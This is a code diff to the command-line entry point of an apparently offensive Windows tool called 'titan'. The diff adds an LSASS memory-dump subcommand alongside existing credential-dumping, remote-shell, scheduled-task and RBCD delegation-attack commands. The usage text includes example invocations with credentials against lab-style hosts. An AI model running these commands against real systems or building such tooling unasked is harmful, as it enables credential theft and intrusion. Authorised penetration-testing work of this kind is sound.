@@ -7,10 +7,11 @@ Think secretsdump + evil-winrm + RBCD, with impacket-compatible flags.
 Usage: titan <subcommand> [options]
 
 Subcommands:
-  dump     Dump SAM, LSA, DCC2, NTDS, DPAPI credentials (secretsdump-style)
-  shell    Interactive WMI+SMB shell (evil-winrm-style)
-  schtask  Scheduled task operations (create/run/delete/query via MS-TSCH)
-  rbcd     Resource-Based Constrained Delegation attack chain
+  dump       Dump SAM, LSA, DCC2, NTDS, DPAPI credentials (secretsdump-style)
+  lsassdump  LSASS memory dump via native service EXE (process reflection)
+  shell      Interactive WMI+SMB shell (evil-winrm-style)
+  schtask    Scheduled task operations (create/run/delete/query via MS-TSCH)
+  rbcd       Resource-Based Constrained Delegation attack chain
 
 Run  titan <subcommand> -h  for per-subcommand help.
 
@@ -26,6 +27,8 @@ Quick examples:
   titan schtask exec  ECORP/veeam-admin:'B@ckupP@ssw0rd'@ecorp-dc.ecorp.local -c cmd.exe -a "/c whoami > C:\\out.txt"
 
   titan rbcd full --delegate-to ECORP-DC$ ECORP/user:'pass'@192.168.15.40
+
+  titan lsassdump ECORP/veeam-admin:'B@ckupP@ssw0rd'@192.168.15.42
 """
 
 import os
@@ -56,6 +59,9 @@ def main():
         _m()
     elif sub == 'rbcd':
         from titanlib.rbcd import main as _m
+        _m()
+    elif sub == 'lsassdump':
+        from titanlib.lsassdump import main as _m
         _m()
     else:
         print(f'[!] Unknown subcommand: {sub!r}\n', file=sys.stderr)
